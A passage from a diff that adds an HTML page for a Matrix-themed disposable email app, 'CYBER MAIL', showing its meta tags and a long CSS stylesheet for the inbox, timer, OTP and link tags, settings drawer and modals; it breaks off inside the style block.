@@ -1,0 +1,2528 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<meta name="theme-color" content="#00FF41" />
+<title>CYBER MAIL — Matrix Edition</title>
+<style>
+  /* ============ RESET ============ */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --accent:    #00FF41;
+    --accent-2:  #00D636;
+    --accent-3:  #008F24;
+    --accent-4:  #7CFF9E;
+    --accent-50: rgba(0, 255, 65, 0.12);
+    --accent-100:rgba(0, 255, 65, 0.22);
+    --bg:        #030704;
+    --bg-2:      #07120A;
+    --surface:   rgba(8, 18, 11, 0.86);
+    --text:      #E6FFEC;
+    --text-soft: #85B892;
+    --border:    rgba(0, 255, 65, 0.24);
+    --radius:    18px;
+    --shadow-intensity: 1;
+    --font-size: 15px;
+
+    --gloss-top:    rgba(255,255,255,.35);
+    --gloss-mid:    rgba(0,255,65,.12);
+    --gloss-bottom: rgba(0,0,0,.45);
+    --mirror: linear-gradient(180deg, rgba(124,255,158,.28) 0%, rgba(0,255,65,.06) 45%, rgba(0,0,0,0) 46%, rgba(0,0,0,.22) 100%);
+  }
+  html { -webkit-text-size-adjust: 100%; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    color: var(--text);
+    font-size: var(--font-size);
+    line-height: 1.5;
+    min-height: 100vh;
+    min-height: 100dvh;
+    overflow-x: hidden;
+    -webkit-tap-highlight-color: transparent;
+    background-color: #020503;
+    background-image:
+      radial-gradient(circle at 15% -10%, rgba(0, 255, 65, 0.16), transparent 45%),
+      radial-gradient(circle at 88% 8%, rgba(0, 180, 50, 0.12), transparent 42%),
+      linear-gradient(180deg, #020503 0%, #050d07 55%, #020503 100%);
+    background-attachment: fixed;
+    background-size: cover;
+    position: relative;
+    transition: background-color .35s ease, color .35s ease;
+  }
+  body::before {
+    content: "";
+    position: fixed; inset: 0;
+    pointer-events: none;
+    z-index: 0;
+    opacity: .35;
+    background-image:
+      radial-gradient(rgba(0, 255, 65, 0.28) 1px, transparent 1.2px),
+      linear-gradient(45deg, transparent 48%, rgba(0, 255, 65, 0.06) 49%, rgba(0, 255, 65, 0.06) 51%, transparent 52%);
+    background-size: 24px 24px, 64px 64px;
+    mask-image: radial-gradient(circle at 50% 35%, #000 45%, transparent 90%);
+    -webkit-mask-image: radial-gradient(circle at 50% 35%, #000 45%, transparent 90%);
+  }
+  body::after {
+    content: "";
+    position: fixed; inset: 0;
+    pointer-events: none;
+    z-index: 0;
+    background:
+      radial-gradient(circle at 50% 0%, rgba(0, 255, 65, 0.08), transparent 50%),
+      radial-gradient(circle at 50% 100%, rgba(0, 0, 0, 0.65), transparent 65%);
+  }
+  button { font-family: inherit; font-size: inherit; color: inherit; background: none; border: none; cursor: pointer; }
+  input, select { font-family: inherit; font-size: inherit; color: inherit; }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  ::selection { background: var(--accent-100); color: var(--accent-4); }
+
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after { animation-duration: .001ms !important; transition-duration: .001ms !important; }
+  }
+
+  /* ============ MATRIX BACKGROUND CANVAS ============ */
+  #fallFx {
+    position: fixed; inset: 0;
+    width: 100%; height: 100%;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* ============ APP SHELL ============ */
+  .app {
+    max-width: 480px;
+    margin: 0 auto;
+    padding: 12px 14px 40px;
+    position: relative;
+    z-index: 1;
+    min-height: 100vh;
+    min-height: 100dvh;
+    padding-top: max(12px, env(safe-area-inset-top));
+    padding-bottom: max(40px, calc(env(safe-area-inset-bottom) + 30px));
+  }
+  @media (min-width: 720px) {
+    .app { max-width: 560px; padding-top: max(24px, env(safe-area-inset-top)); }
+  }
+
+  /* ============ HEADER ============ */
+  .header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 10px 4px 14px;
+    position: sticky; top: 0; z-index: 20;
+    backdrop-filter: blur(14px);
+    -webkit-backdrop-filter: blur(14px);
+    background: linear-gradient(to bottom, rgba(3, 8, 5, 0.92), rgba(3, 8, 5, 0.65));
+    border-bottom: 1px solid rgba(0, 255, 65, 0.14);
+  }
+  .brand { display: flex; align-items: center; gap: 10px; }
+  .brand-logo {
+    width: 44px; height: 44px; border-radius: 14px;
+    display: grid; place-items: center;
+    position: relative;
+    color: #031107;
+    background:
+      radial-gradient(circle at 30% 25%, rgba(255,255,255,.75) 0%, rgba(255,255,255,.15) 30%, transparent 50%),
+      linear-gradient(160deg, var(--accent-4) 0%, var(--accent) 52%, var(--accent-3) 100%);
+    box-shadow:
+      0 1px 0 rgba(255,255,255,.65) inset,
+      0 -2px 0 rgba(0,0,0,.35) inset,
+      0 0 18px rgba(0, 255, 65, 0.35);
+    transition: transform .18s cubic-bezier(.22,1,.36,1), box-shadow .18s, background .35s;
+    overflow: hidden;
+  }
+  .brand-logo::after {
+    content: ""; position: absolute; inset: 0;
+    background: var(--mirror);
+    mix-blend-mode: screen;
+    opacity: .75;
+    pointer-events: none;
+  }
+  .brand-logo:hover { transform: translateY(-1px); }
+  .brand-logo:active { transform: translateY(1px) scale(.96); }
+  .brand-text { display: flex; flex-direction: column; line-height: 1.1; }
+  .brand-title { font-weight: 800; font-size: 17px; letter-spacing: -.2px; color: var(--text); text-shadow: 0 0 12px rgba(0,255,65,.25); }
+  .brand-sub { font-size: 10.5px; font-weight: 800; color: var(--accent); letter-spacing: .8px; text-transform: uppercase; }
+
+  .header-actions { display: flex; align-items: center; gap: 8px; }
+
+  .icon-btn {
+    width: 46px; height: 46px; border-radius: 14px;
+    display: grid; place-items: center;
+    position: relative;
+    color: var(--accent);
+    background:
+      radial-gradient(circle at 30% 20%, rgba(0,255,65,.18) 0%, transparent 55%),
+      linear-gradient(160deg, #0C1B11 0%, #061009 100%);
+    border: 1px solid var(--border);
+    box-shadow:
+      0 1px 0 rgba(0,255,65,.22) inset,
+      0 -2px 0 rgba(0,0,0,.45) inset,
+      0 8px 18px -10px rgba(0,255,65,.35);
+    transition: transform .14s cubic-bezier(.22,1,.36,1), box-shadow .14s, background .35s, color .35s;
+    overflow: hidden;
+  }
+  .icon-btn.playing {
+    border-color: var(--accent);
+    box-shadow: 0 0 16px rgba(0, 255, 65, 0.45);
+  }
+  .icon-btn::before {
+    content: ""; position: absolute; inset: 0;
+    background: var(--mirror);
+    opacity: .45; pointer-events: none;
+  }
+  .icon-btn:hover { transform: translateY(-1px); border-color: var(--accent); }
+  .icon-btn:active { transform: translateY(1px) scale(.95); }
+  .menu-btn { position: relative; }
+  .menu-btn .dot {
+    position: absolute; top: 10px; right: 10px; width: 8px; height: 8px; border-radius: 50%;
+    background: var(--accent);
+    border: 2px solid #061009;
+    box-shadow: 0 0 8px var(--accent);
+  }
+
+  /* ============ CARD ============ */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    box-shadow:
+      0 1px 0 rgba(0,255,65,.16) inset,
+      0 -1px 0 rgba(0,0,0,.45) inset,
+      0 18px 36px -16px rgba(0, 0, 0, 0.75),
+      0 0 24px -12px rgba(0, 255, 65, 0.25);
+    transition: box-shadow .25s ease, transform .2s ease, background .35s, border-color .35s;
+    position: relative;
+  }
+
+  /* ============ EMAIL CARD ============ */
+  .email-card { padding: 16px 16px 14px; position: relative; overflow: hidden; }
+  .email-card::before {
+    content:""; position:absolute; inset:0;
+    background: linear-gradient(135deg, rgba(0, 255, 65, 0.08), transparent 60%);
+    pointer-events:none;
+  }
+  .email-card > * { position: relative; z-index: 1; }
+  .email-label {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 12px; font-weight: 800; color: var(--text-soft);
+    letter-spacing: .4px; text-transform: uppercase; margin-bottom: 10px;
+  }
+  .status-pill {
+    display: inline-flex; align-items: center; gap: 5px;
+    font-size: 10.5px; font-weight: 800; letter-spacing: .3px;
+    padding: 3px 9px; border-radius: 999px; margin-left: auto;
+    background: var(--accent-50); color: var(--accent); text-transform: none;
+    border: 1px solid rgba(0,255,65,.25);
+  }
+  .status-pill .dot {
+    width: 7px; height: 7px; border-radius: 50%;
+    background: var(--accent);
+    box-shadow: 0 0 8px var(--accent);
+  }
+
+  /* ============ USER ID & PERCENT STATS BAR ============ */
+  .user-meta-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+    margin-bottom: 12px;
+  }
+  .meta-box {
+    background: linear-gradient(160deg, rgba(0, 255, 65, 0.08), rgba(4, 12, 7, 0.9));
+    border: 1px solid rgba(0, 255, 65, 0.22);
+    border-radius: 12px;
+    padding: 8px 11px;
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+  .meta-box-label {
+    font-size: 10px;
+    font-weight: 800;
+    color: var(--text-soft);
+    text-transform: uppercase;
+    letter-spacing: .6px;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+  .meta-box-val {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+    font-size: 13px;
+    font-weight: 800;
+    color: var(--accent-4);
+    letter-spacing: .4px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .percent-bar-mini {
+    width: 100%;
+    height: 4px;
+    background: rgba(0, 255, 65, 0.14);
+    border-radius: 99px;
+    overflow: hidden;
+    margin-top: 3px;
+  }
+  .percent-bar-mini-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--accent-3), var(--accent));
+    border-radius: 99px;
+    transition: width .4s ease;
+  }
+
+  .email-value-row { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
+  .email-value {
+    flex: 1; min-width: 0;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+    font-size: 15px; font-weight: 700; letter-spacing: .2px;
+    color: var(--accent-4);
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+    padding: 13px 14px;
+    background: linear-gradient(160deg, #07130A, #040B06);
+    border: 1px solid var(--border);
+    border-radius: 13px;
+    box-shadow:
+      0 1px 0 rgba(0,255,65,.12) inset,
+      0 4px 12px -6px rgba(0,0,0,.7);
+  }
+  .email-value.placeholder { color: var(--text-soft); font-weight: 500; font-family: inherit; }
+
+  .copy-btn {
+    width: 52px; height: 52px; border-radius: 14px; flex-shrink: 0;
+    display: grid; place-items: center;
+    position: relative;
+    color: #031107;
+    background:
+      radial-gradient(circle at 30% 22%, rgba(255,255,255,.7) 0%, transparent 48%),
+      linear-gradient(145deg, var(--accent-4) 0%, var(--accent) 52%, var(--accent-3) 100%);
+    box-shadow:
+      0 1px 0 rgba(255,255,255,.65) inset,
+      0 -3px 0 rgba(0,0,0,.35) inset,
+      0 10px 24px -8px rgba(0,255,65,.55);
+    transition: transform .12s cubic-bezier(.22,1,.36,1), box-shadow .12s, background .35s;
+    overflow: hidden;
+  }
+  .copy-btn::after {
+    content: ""; position: absolute; inset: 0;
+    background: var(--mirror);
+    mix-blend-mode: screen;
+    opacity: .75;
+    pointer-events: none;
+  }
+  .copy-btn:hover { transform: translateY(-1px); }
+  .copy-btn:active { transform: translateY(2px) scale(.96); }
+  .copy-btn:disabled { opacity: .45; cursor: not-allowed; transform: none; }
+
+  .copy-msg {
+    height: 0; overflow: hidden; opacity: 0;
+    font-size: 12.5px; font-weight: 800; color: var(--accent);
+    display: flex; align-items: center; gap: 5px;
+    transition: opacity .25s ease, height .25s ease;
+  }
+  .copy-msg.show { height: 22px; opacity: 1; margin-top: 6px; }
+
+  /* ============ ACTION BUTTONS ============ */
+  .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
+  .btn {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    padding: 14px 12px;
+    font-weight: 800; font-size: 14px; letter-spacing: .2px;
+    border-radius: 14px;
+    transition: transform .12s cubic-bezier(.22,1,.36,1), box-shadow .12s, opacity .2s, background .35s, color .35s;
+    user-select: none;
+    min-height: 50px;
+    position: relative;
+    transform: translateZ(0);
+    overflow: hidden;
+  }
+  .btn::after {
+    content: ""; position: absolute; inset: 0;
+    background: var(--mirror);
+    opacity: .45; pointer-events: none;
+    mix-blend-mode: screen;
+  }
+  .btn > * { position: relative; z-index: 1; }
+  .btn:disabled { opacity: .45; cursor: not-allowed; }
+  .btn:not(:disabled):active { transform: translateY(2px) scale(.98); }
+
+  .btn-primary {
+    color: #031107;
+    background:
+      radial-gradient(circle at 30% 20%, rgba(255,255,255,.55) 0%, transparent 45%),
+      linear-gradient(145deg, var(--accent-4) 0%, var(--accent) 52%, var(--accent-3) 100%);
+    box-shadow:
+      0 1px 0 rgba(255,255,255,.65) inset,
+      0 -3px 0 rgba(0,0,0,.35) inset,
+      0 12px 26px -10px rgba(0,255,65,.6);
+  }
+  .btn-primary:not(:disabled):hover { transform: translateY(-1px); }
+
+  .btn-ghost {
+    color: var(--accent);
+    background:
+      radial-gradient(circle at 30% 20%, rgba(0,255,65,.14) 0%, transparent 50%),
+      linear-gradient(160deg, #0D1E12 0%, #061009 100%);
+    border: 1px solid var(--border);
+    box-shadow:
+      0 1px 0 rgba(0,255,65,.18) inset,
+      0 -2px 0 rgba(0,0,0,.4) inset,
+      0 8px 18px -10px rgba(0,0,0,.7);
+  }
+  .btn-ghost:not(:disabled):hover { transform: translateY(-1px); border-color: var(--accent); }
+
+  .btn-danger {
+    color: #fff;
+    background:
+      radial-gradient(circle at 30% 20%, rgba(255,255,255,.45) 0%, transparent 45%),
+      linear-gradient(145deg, #FF7A7A 0%, #EF4444 55%, #991B1B 100%);
+    box-shadow:
+      0 1px 0 rgba(255,255,255,.5) inset,
+      0 -3px 0 rgba(0,0,0,.35) inset,
+      0 12px 24px -10px rgba(239,68,68,.55);
+  }
+  .btn svg { flex-shrink: 0; }
+
+  .spinner {
+    width: 16px; height: 16px; border-radius: 50%;
+    border: 2.5px solid rgba(3,17,7,.28);
+    border-top-color: #031107;
+    animation: spin .7s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ============ TIMER ============ */
+  .timer-card { margin-top: 12px; padding: 14px 16px 16px; }
+  .timer-head {
+    display: flex; align-items: center; gap: 8px;
+    font-weight: 800; font-size: 13px; color: var(--text-soft);
+    text-transform: uppercase; letter-spacing: .4px;
+    margin-bottom: 10px;
+  }
+  .timer-head svg { color: var(--accent); }
+  .timer-row {
+    display: flex; align-items: center; justify-content: space-between; gap: 10px;
+    margin-bottom: 12px;
+  }
+  .timer-select {
+    appearance: none;
+    padding: 9px 32px 9px 12px;
+    border-radius: 11px;
+    border: 1px solid var(--border);
+    background: #061109 url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%2300FF41' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>") no-repeat right 11px center;
+    font-weight: 700; font-size: 13px;
+    min-width: 120px;
+    cursor: pointer;
+    color: var(--text);
+  }
+  .timer-countdown {
+    font-variant-numeric: tabular-nums;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+    font-size: 22px; font-weight: 900; letter-spacing: 1px;
+    color: var(--accent);
+    text-shadow: 0 0 12px rgba(0,255,65,.35);
+  }
+  .timer-countdown.warning { color: #FF4D4D; text-shadow: 0 0 12px rgba(255,77,77,.45); animation: pulse 1s ease-in-out infinite; }
+  @keyframes pulse { 50% { opacity: .55; } }
+  .timer-bar {
+    height: 10px; border-radius: 999px; background: rgba(0, 255, 65, 0.12);
+    overflow: hidden; position: relative;
+    box-shadow: inset 0 2px 4px rgba(0,0,0,.6);
+  }
+  .timer-bar-fill {
+    height: 100%; width: 100%; border-radius: 999px;
+    background: linear-gradient(90deg, var(--accent-3), var(--accent), var(--accent-4));
+    box-shadow: 0 0 10px rgba(0,255,65,.45);
+    transition: width 1s linear;
+  }
+  .timer-note {
+    margin-top: 10px; font-size: 11.5px; color: var(--text-soft);
+    display: flex; gap: 6px; align-items: flex-start; line-height: 1.45;
+  }
+  .timer-note svg { flex-shrink: 0; margin-top: 1px; color: #FBBF24; }
+
+  /* ============ INBOX ============ */
+  .inbox-card { margin-top: 12px; padding: 16px; }
+  .inbox-head { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; }
+  .inbox-head h2 { font-size: 16px; font-weight: 800; display: flex; align-items: center; gap: 8px; }
+  .inbox-head h2 svg { color: var(--accent); }
+  .count-badge {
+    font-size: 11px; font-weight: 800; padding: 2px 8px; border-radius: 999px;
+    background: var(--accent-50); color: var(--accent); border: 1px solid rgba(0,255,65,.25); margin-left: 4px;
+  }
+  .inbox-head .icon-btn { margin-left: auto; width: 40px; height: 40px; border-radius: 12px; }
+  .search-row { position: relative; margin-bottom: 12px; }
+  .search-row svg { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: var(--text-soft); pointer-events: none; }
+  .search-input {
+    width: 100%; padding: 11px 12px 11px 38px;
+    border-radius: 12px; border: 1px solid var(--border);
+    background: #061009; font-size: 13.5px; font-weight: 500;
+    outline: none; transition: border-color .15s, box-shadow .15s;
+    color: var(--text);
+  }
+  .search-input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(0,255,65,.16); }
+  .search-input::placeholder { color: var(--text-soft); }
+
+  .empty-state { text-align: center; padding: 26px 10px 18px; color: var(--text-soft); }
+  .empty-state svg {
+    color: var(--accent); opacity: .95; margin-bottom: 10px;
+    filter: drop-shadow(0 0 14px rgba(0,255,65,.28));
+  }
+  .empty-state h3 { font-size: 15px; font-weight: 800; color: var(--text); margin-bottom: 4px; }
+  .empty-state p { font-size: 12.5px; line-height: 1.5; }
+
+  .msg-item {
+    display: flex; gap: 11px; padding: 13px;
+    border-radius: 13px; border: 1px solid var(--border);
+    background: linear-gradient(160deg, #0B1A10, #061009);
+    margin-bottom: 10px; cursor: pointer;
+    transition: transform .16s cubic-bezier(.22,1,.36,1), box-shadow .16s, border-color .15s;
+    text-align: left; width: 100%;
+  }
+  .msg-item:hover { transform: translateY(-1px); border-color: var(--accent); }
+  .msg-item:active { transform: translateY(1px) scale(.99); }
+  .msg-avatar {
+    width: 40px; height: 40px; flex-shrink: 0; border-radius: 50%;
+    display: grid; place-items: center;
+    position: relative;
+    font-weight: 800; font-size: 14px; color: #031107;
+    background: linear-gradient(145deg, var(--accent-4) 0%, var(--accent) 55%, var(--accent-3) 100%);
+    box-shadow: 0 0 12px rgba(0,255,65,.35);
+    text-transform: uppercase;
+    overflow: hidden;
+  }
+  .msg-main { flex: 1; min-width: 0; }
+  .msg-top { display: flex; align-items: center; gap: 6px; margin-bottom: 2px; }
+  .msg-from { font-weight: 800; font-size: 13.5px; flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .msg-time { font-size: 11px; color: var(--text-soft); font-weight: 600; flex-shrink: 0; }
+  .msg-subject { font-size: 13px; font-weight: 700; margin-bottom: 3px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--accent-4); }
+  .msg-preview { font-size: 12px; color: var(--text-soft); line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+  .msg-tags { display: flex; gap: 5px; flex-wrap: wrap; margin-top: 7px; }
+  .tag {
+    font-size: 10px; font-weight: 800; padding: 2px 7px; border-radius: 999px;
+    display: inline-flex; align-items: center; gap: 3px; letter-spacing: .2px;
+  }
+  .tag-otp { background: rgba(251, 191, 36, 0.16); color: #FCD34D; border: 1px solid rgba(251,191,36,.3); }
+  .tag-link { background: rgba(59, 130, 246, 0.18); color: #93C5FD; border: 1px solid rgba(59,130,246,.3); }
+  .tag-unread { background: var(--accent-50); color: var(--accent); border: 1px solid rgba(0,255,65,.3); }
+  .msg-item.unread { border-left: 3px solid var(--accent); }
+
+  /* ============ DRAWER ============ */
+  .drawer-backdrop {
+    position: fixed; inset: 0; background: rgba(0, 0, 0, 0.72);
+    backdrop-filter: blur(3px); -webkit-backdrop-filter: blur(3px);
+    opacity: 0; pointer-events: none; transition: opacity .28s ease; z-index: 100;
+  }
+  .drawer-backdrop.open { opacity: 1; pointer-events: auto; }
+  .drawer {
+    position: fixed; top: 0; right: 0; bottom: 0;
+    width: min(88vw, 380px);
+    background: #071109;
+    z-index: 101;
+    transform: translateX(105%);
+    transition: transform .32s cubic-bezier(.22,1,.36,1), background .35s;
+    display: flex; flex-direction: column;
+    box-shadow: -16px 0 48px rgba(0,0,0,.85);
+    border-left: 1px solid var(--border);
+    padding-top: env(safe-area-inset-top);
+  }
+  .drawer.open { transform: translateX(0); }
+  .drawer-head {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 16px 16px 12px; border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+  .drawer-head h2 { font-size: 17px; font-weight: 900; display: flex; align-items: center; gap: 8px; }
+  .drawer-head h2 svg { color: var(--accent); }
+  .drawer-body { overflow-y: auto; padding: 6px 16px 30px; flex: 1; -webkit-overflow-scrolling: touch; }
+  .drawer-section { padding: 14px 0; border-bottom: 1px solid var(--border); }
+  .drawer-section:last-child { border-bottom: none; }
+  .drawer-section h3 {
+    font-size: 11.5px; font-weight: 900; letter-spacing: .8px; text-transform: uppercase;
+    color: var(--accent); margin-bottom: 12px;
+    display: flex; align-items: center; gap: 6px;
+  }
+  .opt-row { display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 8px 0; font-size: 13.5px; font-weight: 600; }
+  .opt-row .lbl { color: var(--text); flex: 1; }
+  .opt-row .lbl small { display: block; font-size: 11px; font-weight: 500; color: var(--text-soft); margin-top: 1px; }
+  .switch {
+    position: relative; width: 46px; height: 28px; flex-shrink: 0;
+    border-radius: 999px; background: #172A1C;
+    border: 1px solid rgba(0,255,65,.2);
+    transition: background .2s;
+  }
+  .switch::after {
+    content:""; position: absolute; top: 3px; left: 3px; width: 20px; height: 20px;
+    border-radius: 50%;
+    background: #85B892;
+    transition: transform .22s cubic-bezier(.22,1,.36,1), background .2s;
+  }
+  .switch.on { background: rgba(0,255,65,.28); border-color: var(--accent); }
+  .switch.on::after { transform: translateX(18px); background: var(--accent); box-shadow: 0 0 8px var(--accent); }
+
+  .color-swatches { display: flex; gap: 8px; flex-wrap: wrap; padding: 4px 0; }
+  .swatch {
+    width: 34px; height: 34px; border-radius: 50%; position: relative;
+    border: 2px solid transparent; transition: transform .12s, border-color .12s;
+  }
+  .swatch.active { border-color: #fff; box-shadow: 0 0 10px var(--accent); }
+  .swatch.custom {
+    display: grid; place-items: center;
+    background: conic-gradient(red,orange,yellow,green,blue,purple,red);
+    overflow: hidden;
+  }
+  .swatch.custom input { opacity: 0; position: absolute; inset: 0; cursor: pointer; }
+
+  .seg-group {
+    display: flex; gap: 6px; background: #050C07; padding: 4px;
+    border-radius: 11px; border: 1px solid var(--border);
+  }
+  .seg-group button {
+    flex: 1; padding: 7px 6px; border-radius: 8px; font-size: 12px; font-weight: 700;
+    color: var(--text-soft); transition: all .15s;
+  }
+  .seg-group button.active {
+    background: rgba(0,255,65,.18);
+    color: var(--accent);
+    border: 1px solid rgba(0,255,65,.35);
+  }
+  .range-wrap { display: flex; align-items: center; gap: 8px; flex: 1; max-width: 160px; }
+  .range-wrap input[type="range"] { flex: 1; accent-color: var(--accent); }
+  .range-val { font-size: 11.5px; font-weight: 800; color: var(--accent); min-width: 34px; text-align: right; }
+
+  .drawer-note { font-size: 11.5px; color: var(--text-soft); line-height: 1.5; padding: 4px 0; }
+  .drawer-btn {
+    width: 100%; padding: 11px; border-radius: 11px; font-weight: 800; font-size: 13px;
+    margin-top: 8px; border: 1px solid var(--border); background: #0B190F;
+    display: flex; align-items: center; justify-content: center; gap: 7px;
+    transition: background .15s, transform .1s;
+    color: var(--text);
+  }
+  .drawer-btn:active { transform: translateY(1px) scale(.98); }
+  .drawer-btn.danger { color: #FCA5A5; border-color: rgba(239,68,68,.35); background: rgba(127,29,29,.25); }
+
+  /* ============ MODAL ============ */
+  .modal-backdrop {
+    position: fixed; inset: 0; background: rgba(0, 0, 0, 0.78);
+    backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
+    z-index: 200; display: grid; place-items: center; padding: 18px;
+    opacity: 0; pointer-events: none; transition: opacity .22s ease;
+  }
+  .modal-backdrop.open { opacity: 1; pointer-events: auto; }
+  .modal {
+    width: 100%; max-width: 440px; max-height: 90vh; max-height: 90dvh;
+    background: #08120B; border-radius: 20px;
+    box-shadow: 0 30px 70px rgba(0,0,0,.9), 0 0 24px -8px rgba(0,255,65,.3);
+    transform: translateY(14px) scale(.97); opacity: 0;
+    transition: transform .28s cubic-bezier(.22,1,.36,1), opacity .22s ease;
+    display: flex; flex-direction: column; overflow: hidden;
+    border: 1px solid var(--border);
+  }
+  .modal-backdrop.open .modal { transform: translateY(0) scale(1); opacity: 1; }
+  .modal-head { display: flex; align-items: center; justify-content: space-between; padding: 15px 16px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
+  .modal-head h3 { font-size: 15.5px; font-weight: 900; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .modal-body { padding: 16px; overflow-y: auto; -webkit-overflow-scrolling: touch; }
+  .modal-foot { padding: 12px 16px 16px; display: flex; gap: 8px; flex-shrink: 0; border-top: 1px solid var(--border); }
+  .modal-foot .btn { flex: 1; min-height: 46px; padding: 11px; font-size: 13.5px; }
+
+  .detail-meta { display: flex; flex-direction: column; gap: 6px; margin-bottom: 14px; padding-bottom: 14px; border-bottom: 1px solid var(--border); }
+  .detail-meta-row { display: flex; gap: 8px; font-size: 12.5px; }
+  .detail-meta-row .k { color: var(--text-soft); font-weight: 700; min-width: 66px; flex-shrink: 0; }
+  .detail-meta-row .v { font-weight: 600; overflow-wrap: anywhere; word-break: break-word; }
+  .otp-box {
+    display: flex; align-items: center; gap: 10px;
+    padding: 11px 13px; border-radius: 13px;
+    background: rgba(251, 191, 36, 0.12);
+    border: 1px solid rgba(251, 191, 36, 0.35); margin-bottom: 10px;
+  }
+  .otp-box .code { font-size: 18px; font-weight: 900; letter-spacing: 2px; font-variant-numeric: tabular-nums; color: #FCD34D; flex: 1; }
+  .otp-box .copy-mini {
+    padding: 6px 11px; border-radius: 9px; background: rgba(251,191,36,.2); font-weight: 800; font-size: 12px;
+    color: #FCD34D; border: 1px solid rgba(251,191,36,.4); display: flex; align-items: center; gap: 5px;
+  }
+  .link-box {
+    display: flex; align-items: center; gap: 10px;
+    padding: 10px 12px; border-radius: 12px;
+    background: rgba(59, 130, 246, 0.12); border: 1px solid rgba(59, 130, 246, 0.3); margin-bottom: 8px;
+  }
+  .link-box a { font-size: 12px; font-weight: 700; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1; min-width: 0; color: #93C5FD; }
+  .link-box .open-link-btn {
+    padding: 6px 10px; border-radius: 8px;
+    background: linear-gradient(145deg, var(--accent-4), var(--accent));
+    color:#031107; font-weight: 800; font-size: 11.5px; flex-shrink: 0; display: flex; align-items: center; gap: 4px;
+  }
+  .email-body { font-size: 13.5px; line-height: 1.6; overflow-wrap: anywhere; word-break: break-word; color: var(--text); white-space: pre-wrap; }
+  .email-body img { max-width: 100%; height: auto; border-radius: 8px; }
+  .email-body a { color: var(--accent); font-weight: 600; }
+  .email-body pre { white-space: pre-wrap; word-break: break-word; font-family: inherit; }
+  .email-body * { max-width: 100% !important; }
+
+  /* ============ TOAST ============ */
+  .toast-wrap {
+    position: fixed; left: 50%; bottom: max(24px, env(safe-area-inset-bottom));
+    transform: translateX(-50%);
+    z-index: 300; display: flex; flex-direction: column; gap: 8px; align-items: center;
+    width: min(92vw, 400px); pointer-events: none;
+  }
+  .toast {
+    padding: 11px 16px; border-radius: 13px;
+    background: #0A170E; color: var(--text);
+    border: 1px solid var(--border);
+    font-size: 13px; font-weight: 700;
+    display: flex; align-items: center; gap: 8px;
+    box-shadow: 0 16px 40px -8px rgba(0,0,0,.85), 0 0 16px -6px rgba(0,255,65,.35);
+    transform: translateY(20px); opacity: 0;
+    transition: transform .28s cubic-bezier(.22,1,.36,1), opacity .22s;
+    pointer-events: auto; max-width: 100%;
+  }
+  .toast.show { transform: translateY(0); opacity: 1; }
+  .toast.success svg { color: var(--accent); }
+  .toast.error svg { color: #F87171; }
+  .toast.info svg { color: #93C5FD; }
+
+  .err-note {
+    margin-top: 12px; padding: 10px 12px; border-radius: 12px;
+    background: rgba(127, 29, 29, 0.35); border: 1px solid rgba(248, 113, 113, 0.4); color: #FCA5A5;
+    font-size: 12px; font-weight: 600; line-height: 1.5;
+    white-space: pre-wrap; overflow-wrap: anywhere; user-select: text;
+  }
+
+  /* ============ MISC ============ */
+  .hidden { display: none !important; }
+  body.compact .card { padding: 10px 12px; }
+  body.compact .msg-item { padding: 10px; }
+  body.no-anim *, body.no-anim *::before, body.no-anim *::after {
+    animation-duration: .001ms !important; transition-duration: .001ms !important;
+  }
+  body.no-3d .btn, body.no-3d .copy-btn, body.no-3d .brand-logo, body.no-3d .icon-btn, body.no-3d .msg-avatar {
+    box-shadow: none !important;
+    transform: none !important;
+  }
+  body.no-3d .btn::after, body.no-3d .copy-btn::after, body.no-3d .brand-logo::after, body.no-3d .icon-btn::before, body.no-3d .msg-avatar::after { display: none !important; }
+  body.no-bgdeco::before, body.no-bgdeco::after { display: none !important; }
+  body.no-bgdeco { background-image: none !important; }
+  body.btn-flat .btn,
+  body.btn-flat .copy-btn,
+  body.btn-flat .brand-logo,
+  body.btn-flat .icon-btn {
+    box-shadow: none !important;
+    transform: none !important;
+  }
